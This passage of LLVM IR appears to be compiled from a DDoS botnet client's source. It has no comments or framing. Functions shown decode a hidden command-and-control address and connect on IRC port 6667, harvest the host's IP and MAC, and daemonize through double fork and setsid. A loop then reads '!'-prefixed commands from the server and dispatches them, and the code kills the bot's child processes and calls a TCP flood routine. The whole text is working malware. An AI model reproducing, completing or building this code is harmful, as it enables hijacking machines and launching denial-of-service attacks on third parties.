  call void @sendTCP(i8* %576, i32 %577, i32 %578, i32 %579, i8* %580, i32 %581, i32 %582)
  %583 = load i32, i32* @mainCommSock, align 4
  %584 = call i32 @close(i32 %583)
  call void @_exit(i32 0) #12
  unreachable

; <label>:585:                                    ; preds = %566
  br label %586

; <label>:586:                                    ; preds = %585, %447
  %587 = load i8**, i8*** %4, align 8
  %588 = getelementptr inbounds i8*, i8** %587, i64 0
  %589 = load i8*, i8** %588, align 8
  %590 = call i32 @strcmp(i8* %589, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0)) #10
  %591 = icmp ne i32 %590, 0
  br i1 %591, label %633, label %592

; <label>:592:                                    ; preds = %586
  store i32 0, i32* %32, align 4
  store i64 0, i64* %33, align 8
  br label %593

; <label>:593:                                    ; preds = %619, %592
  %594 = load i64, i64* %33, align 8
  %595 = load i64, i64* @numpids, align 8
  %596 = icmp ult i64 %594, %595
  br i1 %596, label %597, label %622

; <label>:597:                                    ; preds = %593
  %598 = load i32*, i32** @pids, align 8
  %599 = load i64, i64* %33, align 8
  %600 = getelementptr inbounds i32, i32* %598, i64 %599
  %601 = load i32, i32* %600, align 4
  %602 = icmp ne i32 %601, 0
  br i1 %602, label %603, label %618

; <label>:603:                                    ; preds = %597
  %604 = load i32*, i32** @pids, align 8
  %605 = load i64, i64* %33, align 8
  %606 = getelementptr inbounds i32, i32* %604, i64 %605
  %607 = load i32, i32* %606, align 4
  %608 = call i32 @getpid() #4
  %609 = icmp ne i32 %607, %608
  br i1 %609, label %610, label %618

; <label>:610:                                    ; preds = %603
  %611 = load i32*, i32** @pids, align 8
  %612 = load i64, i64* %33, align 8
  %613 = getelementptr inbounds i32, i32* %611, i64 %612
  %614 = load i32, i32* %613, align 4
  %615 = call i32 @kill(i32 %614, i32 9) #4
  %616 = load i32, i32* %32, align 4
  %617 = add nsw i32 %616, 1
  store i32 %617, i32* %32, align 4
  br label %618

; <label>:618:                                    ; preds = %610, %603, %597
  br label %619

; <label>:619:                                    ; preds = %618
  %620 = load i64, i64* %33, align 8
  %621 = add i64 %620, 1
  store i64 %621, i64* %33, align 8
  br label %593

; <label>:622:                                    ; preds = %593
  %623 = load i32, i32* %32, align 4
  %624 = icmp sgt i32 %623, 0
  br i1 %624, label %625, label %629

; <label>:625:                                    ; preds = %622
  %626 = load i32, i32* @mainCommSock, align 4
  %627 = load i32, i32* %32, align 4
  %628 = call i32 (i32, i8*, ...) @sockprintf(i32 %626, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.69, i32 0, i32 0), i32 %627)
  br label %632

; <label>:629:                                    ; preds = %622
  %630 = load i32, i32* @mainCommSock, align 4
  %631 = call i32 (i32, i8*, ...) @sockprintf(i32 %630, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i32 0, i32 0))
  br label %632

; <label>:632:                                    ; preds = %629, %625
  br label %633

; <label>:633:                                    ; preds = %632, %586
  %634 = load i8**, i8*** %4, align 8
  %635 = getelementptr inbounds i8*, i8** %634, i64 0
  %636 = load i8*, i8** %635, align 8
  %637 = call i32 @strcmp(i8* %636, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0)) #10
  %638 = icmp ne i32 %637, 0
  br i1 %638, label %640, label %639

; <label>:639:                                    ; preds = %633
  call void @exit(i32 0) #14
  unreachable

; <label>:640:                                    ; preds = %633, %570, %498, %436, %400, %369, %307, %240, %198, %164, %122, %97, %92, %87, %74, %62, %48, %39
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @decode(i8* %24)
  %26 = call i8* @strcpy(i8* %20, i8* %25) #4
  store i32 6667, i32* %3, align 4
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %28 = call i8* @strchr(i8* %27, i32 58) #10
  %29 = icmp ne i8* %28, null
  br i1 %29, label %30, label %37

; <label>:30:                                     ; preds = %19
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %32 = call i8* @strchr(i8* %31, i32 58) #10
  %33 = getelementptr inbounds i8, i8* %32, i64 1
  %34 = call i32 @atoi(i8* %33) #10
  store i32 %34, i32* %3, align 4
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %36 = call i8* @strchr(i8* %35, i32 58) #10
  store i8 0, i8* %36, align 1
  br label %37

; <label>:37:                                     ; preds = %30, %19
  %38 = call i32 @socket(i32 2, i32 1, i32 0) #4
  store i32 %38, i32* @mainCommSock, align 4
  %39 = load i32, i32* @mainCommSock, align 4
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %41 = load i32, i32* %3, align 4
  %42 = call i32 @connectTimeout(i32 %39, i8* %40, i32 %41, i32 30)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %45, label %44

; <label>:44:                                     ; preds = %37
  store i32 1, i32* %1, align 4
  br label %46

; <label>:45:                                     ; preds = %37
  store i32 0, i32* %1, align 4
  br label %46

; <label>:46:                                     ; preds = %45, %44
  %47 = load i32, i32* %1, align 4
  ret i32 %47
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #4
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.72, i32 0, i32 0)) #4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #4
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.73, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #4
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #4
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79

; <label>:97:                                     ; preds = %79
  br label %98

; <label>:98:                                     ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

; <label>:101:                                    ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [1024 x i8], align 16
  %19 = alloca i32, align 4
  %20 = alloca [10 x i8*], align 16
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @getpid() #4
  %26 = xor i32 %24, %25
  call void @srand(i32 %26) #4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = call i32 @getpid() #4
  %29 = xor i32 %27, %28
  call void @init_rand(i32 %29)
  %30 = call i32 @getOurIP()
  %31 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 1), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 2), align 1
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 3), align 1
  %38 = zext i8 %37 to i32
  %39 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 4), align 1
  %40 = zext i8 %39 to i32
  %41 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 5), align 1
  %42 = zext i8 %41 to i32
  %43 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.76, i32 0, i32 0), i32 %32, i32 %34, i32 %36, i32 %38, i32 %40, i32 %42)
  %44 = call i32 @fork() #4
  store i32 %44, i32* %6, align 4
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %49

; <label>:46:                                     ; preds = %2
  %47 = load i32, i32* %6, align 4
  %48 = call i32 @waitpid(i32 %47, i32* %8, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:49:                                     ; preds = %2
  %50 = load i32, i32* %6, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %64, label %52

; <label>:52:                                     ; preds = %49
  %53 = call i32 @fork() #4
  store i32 %53, i32* %7, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %52
  call void @exit(i32 0) #14
  unreachable

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* %7, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

; <label>:59:                                     ; preds = %56
  br label %62

; <label>:60:                                     ; preds = %56
  %61 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0))
  br label %62

; <label>:62:                                     ; preds = %60, %59
  br label %63

; <label>:63:                                     ; preds = %62
  br label %66

; <label>:64:                                     ; preds = %49
  %65 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0))
  br label %66

; <label>:66:                                     ; preds = %64, %63
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = call i32 @setsid() #4
  %69 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0)) #4
  %70 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #4
  br label %71

; <label>:71:                                     ; preds = %368, %74, %67
  %72 = call i32 @initConnection()
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %71
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.79, i32 0, i32 0))
  %76 = call i32 @sleep(i32 5)
  br label %71

; <label>:77:                                     ; preds = %71
  %78 = load i32, i32* @mainCommSock, align 4
  %79 = call i8* @getBuild()
  %80 = call i32 (i32, i8*, ...) @sockprintf(i32 %78, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i8* %79)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %81

; <label>:81:                                     ; preds = %367, %286, %208, %170, %77
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %84 = call i32 @recvLine(i32 %82, i8* %83, i32 4096)
  store i32 %84, i32* %10, align 4
  %85 = icmp ne i32 %84, -1
  br i1 %85, label %86, label %368

; <label>:86:                                     ; preds = %81
  store i32 0, i32* %11, align 4
  br label %87

; <label>:87:                                     ; preds = %158, %86
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = load i64, i64* @numpids, align 8
  %91 = icmp ult i64 %89, %90
  br i1 %91, label %92, label %161

; <label>:92:                                     ; preds = %87
  %93 = load i32*, i32** @pids, align 8
  %94 = load i32, i32* %11, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i32, i32* %93, i64 %95
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @waitpid(i32 %97, i32* null, i32 1)
  %99 = icmp sgt i32 %98, 0
  br i1 %99, label %100, label %157

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %11, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %13, align 4
  br label %103

; <label>:103:                                    ; preds = %119, %100
  %104 = load i32, i32* %13, align 4
  %105 = zext i32 %104 to i64
  %106 = load i64, i64* @numpids, align 8
  %107 = icmp ult i64 %105, %106
  br i1 %107, label %108, label %122

; <label>:108:                                    ; preds = %103
  %109 = load i32*, i32** @pids, align 8
  %110 = load i32, i32* %13, align 4
  %111 = zext i32 %110 to i64
  %112 = getelementptr inbounds i32, i32* %109, i64 %111
  %113 = load i32, i32* %112, align 4
  %114 = load i32*, i32** @pids, align 8
  %115 = load i32, i32* %13, align 4
  %116 = sub i32 %115, 1
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %114, i64 %117
  store i32 %113, i32* %118, align 4
  br label %119

; <label>:119:                                    ; preds = %108
  %120 = load i32, i32* %13, align 4
  %121 = add i32 %120, 1
  store i32 %121, i32* %13, align 4
  br label %103

; <label>:122:                                    ; preds = %103
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %13, align 4
  %125 = sub i32 %124, 1
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %123, i64 %126
  store i32 0, i32* %127, align 4
  %128 = load i64, i64* @numpids, align 8
  %129 = add i64 %128, -1
  store i64 %129, i64* @numpids, align 8
  %130 = load i64, i64* @numpids, align 8
  %131 = add i64 %130, 1
  %132 = mul i64 %131, 4
  %133 = call noalias i8* @malloc(i64 %132) #4
  %134 = bitcast i8* %133 to i32*
  store i32* %134, i32** %12, align 8
  store i32 0, i32* %13, align 4
  br label %135

; <label>:135:                                    ; preds = %150, %122
  %136 = load i32, i32* %13, align 4
  %137 = zext i32 %136 to i64
  %138 = load i64, i64* @numpids, align 8
  %139 = icmp ult i64 %137, %138
  br i1 %139, label %140, label %153

; <label>:140:                                    ; preds = %135
  %141 = load i32*, i32** @pids, align 8
  %142 = load i32, i32* %13, align 4
  %143 = zext i32 %142 to i64
  %144 = getelementptr inbounds i32, i32* %141, i64 %143
  %145 = load i32, i32* %144, align 4
  %146 = load i32*, i32** %12, align 8
  %147 = load i32, i32* %13, align 4
  %148 = zext i32 %147 to i64
  %149 = getelementptr inbounds i32, i32* %146, i64 %148
  store i32 %145, i32* %149, align 4
  br label %150

; <label>:150:                                    ; preds = %140
  %151 = load i32, i32* %13, align 4
  %152 = add i32 %151, 1
  store i32 %152, i32* %13, align 4
  br label %135

; <label>:153:                                    ; preds = %135
  %154 = load i32*, i32** @pids, align 8
  %155 = bitcast i32* %154 to i8*
  call void @free(i8* %155) #4
  %156 = load i32*, i32** %12, align 8
  store i32* %156, i32** @pids, align 8
  br label %157

; <label>:157:                                    ; preds = %153, %92
  br label %158

; <label>:158:                                    ; preds = %157
  %159 = load i32, i32* %11, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %11, align 4
  br label %87

; <label>:161:                                    ; preds = %87
  %162 = load i32, i32* %10, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %163
  store i8 0, i8* %164, align 1
  %165 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %165)
  %166 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %167 = call i8* @strstr(i8* %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %169 = icmp eq i8* %167, %168
  br i1 %169, label %170, label %173

; <label>:170:                                    ; preds = %161
  %171 = load i32, i32* @mainCommSock, align 4
  %172 = call i32 (i32, i8*, ...) @sockprintf(i32 %171, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.81, i32 0, i32 0))
  br label %81

; <label>:173:                                    ; preds = %161
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %175 = call i8* @strstr(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0)) #10
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %177 = icmp eq i8* %175, %176
  br i1 %177, label %178, label %179

; <label>:178:                                    ; preds = %173
  call void @exit(i32 0) #14
  unreachable

; <label>:179:                                    ; preds = %173
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %180, i8** %14, align 8
  %181 = load i8*, i8** %14, align 8
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 33
  br i1 %184, label %185, label %367

; <label>:185:                                    ; preds = %179
  %186 = load i8*, i8** %14, align 8
  %187 = getelementptr inbounds i8, i8* %186, i64 1
  store i8* %187, i8** %15, align 8
  br label %188

; <label>:188:                                    ; preds = %200, %185
  %189 = load i8*, i8** %15, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp ne i32 %191, 32
  br i1 %192, label %193, label %198

; <label>:193:                                    ; preds = %188
  %194 = load i8*, i8** %15, align 8
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp ne i32 %196, 0
  br label %198

; <label>:198:                                    ; preds = %193, %188
  %199 = phi i1 [ false, %188 ], [ %197, %193 ]
  br i1 %199, label %200, label %203

; <label>:200:                                    ; preds = %198
  %201 = load i8*, i8** %15, align 8
  %202 = getelementptr inbounds i8, i8* %201, i32 1
  store i8* %202, i8** %15, align 8
  br label %188

; <label>:203:                                    ; preds = %198
  %204 = load i8*, i8** %15, align 8
  %205 = load i8, i8* %204, align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %208, label %209

; <label>:208:                                    ; preds = %203
  br label %81

; <label>:209:                                    ; preds = %203
  %210 = load i8*, i8** %15, align 8
  store i8 0, i8* %210, align 1
  %211 = load i8*, i8** %14, align 8
  %212 = getelementptr inbounds i8, i8* %211, i64 1
  store i8* %212, i8** %15, align 8
  %213 = load i8*, i8** %14, align 8
  %214 = load i8*, i8** %15, align 8
  %215 = call i64 @strlen(i8* %214) #10
  %216 = getelementptr inbounds i8, i8* %213, i64 %215
  %217 = getelementptr inbounds i8, i8* %216, i64 2
  store i8* %217, i8** %14, align 8
  br label %218

; <label>:218:                                    ; preds = %238, %209
  %219 = load i8*, i8** %14, align 8
  %220 = load i8*, i8** %14, align 8
  %221 = call i64 @strlen(i8* %220) #10
  %222 = sub i64 %221, 1
  %223 = getelementptr inbounds i8, i8* %219, i64 %222
  %224 = load i8, i8* %223, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 10
  br i1 %226, label %236, label %227

; <label>:227:                                    ; preds = %218
  %228 = load i8*, i8** %14, align 8
  %229 = load i8*, i8** %14, align 8
  %230 = call i64 @strlen(i8* %229) #10
  %231 = sub i64 %230, 1
  %232 = getelementptr inbounds i8, i8* %228, i64 %231
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 13
  br label %236

; <label>:236:                                    ; preds = %227, %218
  %237 = phi i1 [ true, %218 ], [ %235, %227 ]
  br i1 %237, label %238, label %244

; <label>:238:                                    ; preds = %236
  %239 = load i8*, i8** %14, align 8
  %240 = load i8*, i8** %14, align 8
  %241 = call i64 @strlen(i8* %240) #10
  %242 = sub i64 %241, 1
  %243 = getelementptr inbounds i8, i8* %239, i64 %242
  store i8 0, i8* %243, align 1
  br label %218

; <label>:244:                                    ; preds = %236
  %245 = load i8*, i8** %14, align 8
  store i8* %245, i8** %16, align 8
  br label %246

; <label>:246:                                    ; preds = %258, %244
  %247 = load i8*, i8** %14, align 8
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp ne i32 %249, 32
  br i1 %250, label %251, label %256

; <label>:251:                                    ; preds = %246
  %252 = load i8*, i8** %14, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp ne i32 %254, 0
  br label %256

; <label>:256:                                    ; preds = %251, %246
  %257 = phi i1 [ false, %246 ], [ %255, %251 ]
  br i1 %257, label %258, label %261

; <label>:258:                                    ; preds = %256
  %259 = load i8*, i8** %14, align 8
  %260 = getelementptr inbounds i8, i8* %259, i32 1
  store i8* %260, i8** %14, align 8
  br label %246

; <label>:261:                                    ; preds = %256
  %262 = load i8*, i8** %14, align 8
  store i8 0, i8* %262, align 1
  %263 = load i8*, i8** %14, align 8
  %264 = getelementptr inbounds i8, i8* %263, i32 1
  store i8* %264, i8** %14, align 8
  %265 = load i8*, i8** %16, align 8
  store i8* %265, i8** %17, align 8
  br label %266

; <label>:266:                                    ; preds = %270, %261
  %267 = load i8*, i8** %17, align 8
  %268 = load i8, i8* %267, align 1
  %269 = icmp ne i8 %268, 0
  br i1 %269, label %270, label %279

; <label>:270:                                    ; preds = %266
  %271 = load i8*, i8** %17, align 8
  %272 = load i8, i8* %271, align 1
  %273 = zext i8 %272 to i32
  %274 = call i32 @toupper(i32 %273) #10
  %275 = trunc i32 %274 to i8
  %276 = load i8*, i8** %17, align 8
  store i8 %275, i8* %276, align 1
  %277 = load i8*, i8** %17, align 8
  %278 = getelementptr inbounds i8, i8* %277, i32 1
  store i8* %278, i8** %17, align 8
  br label %266

; <label>:279:                                    ; preds = %266
  %280 = load i8*, i8** %16, align 8
  %281 = call i32 @strcmp(i8* %280, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i32 0, i32 0)) #10
  %282 = icmp eq i32 %281, 0
  br i1 %282, label %283, label %309

; <label>:283:                                    ; preds = %279
  %284 = call i32 @listFork()
  %285 = icmp ne i32 %284, 0
